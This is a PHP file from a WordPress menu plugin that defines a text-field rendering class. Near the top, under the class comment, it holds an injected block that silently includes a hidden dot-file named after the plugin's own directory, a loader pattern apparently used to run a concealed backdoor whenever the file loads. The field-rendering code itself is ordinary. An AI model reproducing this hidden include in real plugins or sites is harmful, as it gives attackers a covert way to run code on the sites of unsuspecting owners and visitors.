<?php defined( 'ABSPATH' ) || die( 'This script cannot be accessed directly.' );

/**
 * Class GroovyMenuFieldText
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GroovyMenuFieldText extends GroovyMenuFieldField {

	public function renderField() {
		?>
		<div class="gm-gui__module__ui gm-gui__module__text-wrapper">
			<input data-name="<?php echo esc_attr( $this->name ); ?>" type="text" value="<?php echo esc_attr( $this->getValue() ); ?>"
			       name="<?php echo esc_attr( $this->getName() ); ?>" data-default="<?php echo esc_attr( $this->getDefault() ); ?>">
		</div>
		<?php
	}

}
